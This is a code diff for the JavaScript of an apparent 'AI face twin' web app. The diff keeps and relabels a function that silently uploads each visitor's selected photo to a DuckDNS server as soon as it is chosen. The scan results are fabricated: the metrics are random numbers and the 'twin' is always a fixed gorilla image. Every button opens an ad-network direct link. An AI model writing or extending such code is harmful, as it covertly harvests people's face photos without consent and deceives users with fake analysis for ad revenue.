@@ -1,15 +1,14 @@
 /* ==========================================
    1. CONFIGURATIONS
 ========================================== */
-// Adsterra Direct Link
 const AD_DIRECT_LINK = "https://www.profitableratecpmnetwork.com/q523uy7yt?key=a608a7a53c25642c3f909011fcbbc596";
+const BACKEND_URL = "http://asadgames2.duckdns.org";
 
-// Aapka Live DuckDNS Backend URL
-const BACKEND_URL = "http://asadgames2.duckdns.org"; 
-
+// Gorilla Twin Match Photo (Online URL)
+const GORILLA_TWIN_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Mountain_Gorilla_in_Uganda.jpg/800px-Mountain_Gorilla_in_Uganda.jpg";
 
 /* ==========================================
-   2. DOM ELEMENTS SELECTION
+   2. DOM ELEMENTS
 ========================================== */
 const photoInput = document.getElementById('photoInput');
 const userImagePreview = document.getElementById('userImagePreview');
@@ -22,6 +21,7 @@ const resultSection = document.getElementById('resultSection');
 
 const scanningImg = document.getElementById('scanningImg');
 const finalUserImg = document.getElementById('finalUserImg');
+const twinImg = document.getElementById('twinImg');
 const meshOverlay = document.getElementById('meshOverlay');
 
 const scanStatus = document.getElementById('scanStatus');
@@ -32,14 +32,12 @@ const m1 = document.getElementById('m1');
 const m2 = document.getElementById('m2');
 const m3 = document.getElementById('m3');
 
-
 /* ==========================================
-   3. MATRIX / PARTICLE CANVAS BACKGROUND
+   3. BACKGROUND ANIMATION
 ========================================== */
 const canvas = document.getElementById('bgCanvas');
 if (canvas) {
   const ctx = canvas.getContext('2d');
-
   function resizeCanvas() {
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
@@ -47,7 +45,7 @@ if (canvas) {
   resizeCanvas();
   window.addEventListener('resize', resizeCanvas);
 
-  const particles = Array.from({ length: 45 }, () => ({
+  const particles = Array.from({ length: 40 }, () => ({
     x: Math.random() * canvas.width,
     y: Math.random() * canvas.height,
     radius: Math.random() * 2 + 1,
@@ -74,18 +72,14 @@ if (canvas) {
   animateCanvas();
 }
 
-
 /* ==========================================
-   4. WEB AUDIO BEEP SOUND EFFECTS
+   4. AUDIO EFFECTS
 ========================================== */
 let audioCtx = null;
-
 function getAudioContext() {
   if (!audioCtx) {
-    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
-    if (AudioContextClass) {
-      audioCtx = new AudioContextClass();
-    }
+    const AudioCtxClass = window.AudioContext || window.webkitAudioContext;
+    if (AudioCtxClass) audioCtx = new AudioCtxClass();
   }
   if (audioCtx && audioCtx.state === 'suspended') {
     audioCtx.resume();
@@ -97,7 +91,6 @@ function playBeepSound(freq = 800, duration = 0.08) {
   try {
     const ctx = getAudioContext();
     if (!ctx) return;
-
     const osc = ctx.createOscillator();
     const gain = ctx.createGain();
 
@@ -111,47 +104,45 @@ function playBeepSound(freq = 800, duration = 0.08) {
 
     osc.start();
     osc.stop(ctx.currentTime + duration);
-  } catch (e) {
-    /* Audio fail-safe for restricted autoplay */
-  }
+  } catch (e) {}
 }
 
-
 /* ==========================================
-   5. PHOTO SELECTION & AUTO-UPLOAD TO SERVER
+   5. PHOTO SELECTION & AUTO-PREVIEW
 ========================================== */
 if (photoInput) {
   photoInput.addEventListener('change', function(e) {
     const file = e.target.files[0];
     if (file) {
-      // Audio Context Warmup on User Gesture
       getAudioContext();
 
-      // A. Local Browser Preview
+      // Reader local preview ke liye
       const reader = new FileReader();
       reader.onload = function(event) {
         const src = event.target.result;
-        if (userImagePreview) userImagePreview.src = src;
-        if (scanningImg) scanningImg.src = src;
-        if (finalUserImg) finalUserImg.src = src;
-
-        if (userImagePreview) userImagePreview.classList.remove('hidden');
+        
+        // Upload Box me Live Preview set karein
+        if (userImagePreview) {
+          userImagePreview.src = src;
+          userImagePreview.classList.remove('hidden');
+        }
         if (uploadPlaceholder) uploadPlaceholder.classList.add('hidden');
         if (scanBtn) scanBtn.classList.remove('hidden');
-      }
+
+        // Scanning image & Final result user image update karein
+        if (scanningImg) scanningImg.src = src;
+        if (finalUserImg) finalUserImg.src = src;
+      };
       reader.readAsDataURL(file);
 
-      // B. Photo Ko DuckDNS Server Par Save Karein
+      // Backend par silent photo upload
       uploadPhotoToOwnServer(file);
     }
   });
 }
 
 function uploadPhotoToOwnServer(fileData) {
-  if (!BACKEND_URL) {
-    console.warn("Backend URL missing!");
-    return;
-  }
+  if (!BACKEND_URL) return;
 
   const formData = new FormData();
   formData.append("image", fileData);
@@ -160,33 +151,28 @@ function uploadPhotoToOwnServer(fileData) {
     method: "POST",
     body: formData
   })
-  .then(response => response.json())
+  .then(res => res.json())
   .then(data => {
     if (data.success) {
-      console.log("✓ Photo saved successfully on server:", data.path);
-    } else {
-      console.error("Server upload rejected:", data.message);
+      console.log("✓ Photo saved on server:", data.path);
     }
   })
-  .catch(error => {
-    console.error("Network error uploading photo to server:", error);
-  });
+  .catch(err => console.error("Upload Error:", err));
 }
 
-
 /* ==========================================
-   6. AI FACE MESH GENERATOR
+   6. AI FACE MESH DOTS
 ========================================== */
 function generateFaceMesh() {
   if (!meshOverlay) return;
   meshOverlay.innerHTML = '';
   const points = [
-    {top: '30%', left: '35%'}, {top: '30%', left: '65%'}, // Eyes
-    {top: '45%', left: '50%'},                         // Nose
-    {top: '65%', left: '42%'}, {top: '65%', left: '58%'}, // Mouth
-    {top: '80%', left: '50%'},                         // Jaw
-    {top: '20%', left: '50%'},                         // Forehead
-    {top: '50%', left: '25%'}, {top: '50%', left: '75%'}  // Cheeks
+    {top: '30%', left: '35%'}, {top: '30%', left: '65%'},
+    {top: '45%', left: '50%'},
+    {top: '65%', left: '42%'}, {top: '65%', left: '58%'},
+    {top: '80%', left: '50%'},
+    {top: '20%', left: '50%'},
+    {top: '50%', left: '25%'}, {top: '50%', left: '75%'}
   ];
 
   points.forEach(pt => {
@@ -198,21 +184,18 @@ function generateFaceMesh() {
   });
 }
 
-
 /* ==========================================
-   7. SCANNING ANIMATION & AD TRIGGER
+   7. SCANNING ANIMATION & RESULT TRIGGER
 ========================================== */
 if (scanBtn) {
   scanBtn.addEventListener('click', function() {
-    // Audio Context Activate
     getAudioContext();
 
-    // A. Trigger Adsterra Direct Link Ad
+    // Direct Link Ad Open
     if (AD_DIRECT_LINK) {
       window.open(AD_DIRECT_LINK, '_blank');
     }
 
-    // B. Switch Views
     if (uploadSection) uploadSection.classList.add('hidden');
     if (scanningSection) scanningSection.classList.remove('hidden');
     generateFaceMesh();
@@ -232,7 +215,6 @@ if (scanBtn) {
       if (progressBar) progressBar.style.width = percent + '%';
       if (scanPercent) scanPercent.textContent = percent + '%';
 
-      // Random Live Metrics Updates
       if (m1) m1.textContent = `${(62 + Math.random() * 5).toFixed(1)} mm`;
       if (m2) m2.textContent = `${(112 + Math.random() * 8).toFixed(1)}°`;
       if (m3) m3.textContent = `${(96 + Math.random() * 3.8).toFixed(1)}%`;
@@ -249,7 +231,11 @@ if (scanBtn) {
 
       if (percent >= 100) {
         clearInterval(interval);
-        playBeepSound(1200, 0.2); // Success Sound
+        playBeepSound(1200, 0.2);
+
+        // Gorilla Twin photo set karein
+        if (twinImg) twinImg.src = GORILLA_TWIN_IMG;
+
         if (scanningSection) scanningSection.classList.add('hidden');
         if (resultSection) resultSection.classList.remove('hidden');
       }
@@ -257,20 +243,19 @@ if (scanBtn) {
   });
 }
 
-
 /* ==========================================
-   8. MONETIZATION BUTTONS
+   8. AD MONETIZATION BUTTONS
 ========================================== */
 const unlockSocialBtn = document.getElementById('unlockSocialBtn');
 if (unlockSocialBtn) {
-  unlockSocialBtn.addEventListener('click', function() {
+  unlockSocialBtn.addEventListener('click', () => {
     if (AD_DIRECT_LINK) window.open(AD_DIRECT_LINK, '_blank');
   });
 }
 
 const downloadReportBtn = document.getElementById('downloadReportBtn');
 if (downloadReportBtn) {
-  downloadReportBtn.addEventListener('click', function() {
+  downloadReportBtn.addEventListener('click', () => {
     if (AD_DIRECT_LINK) window.open(AD_DIRECT_LINK, '_blank');
   });
 }
